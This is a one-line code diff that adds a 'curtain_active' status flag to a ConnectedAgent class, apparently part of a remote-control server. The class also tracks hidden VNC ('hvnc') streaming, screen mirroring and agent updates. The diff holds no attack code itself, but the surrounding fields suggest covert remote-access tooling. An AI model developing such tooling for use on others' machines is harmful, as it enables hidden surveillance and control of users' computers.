@@ -239,6 +239,7 @@ class ConnectedAgent:
             "last_heartbeat": self.last_heartbeat,
             "is_streaming": self.is_streaming_hvnc,
             "is_mirroring": self.is_streaming_mirror,
+            "curtain_active": bool(self.client_info.get("curtain_active", False)),
             "code_hash": agent_hash,
             "server_hash": server_hash,
             "has_update": has_update,
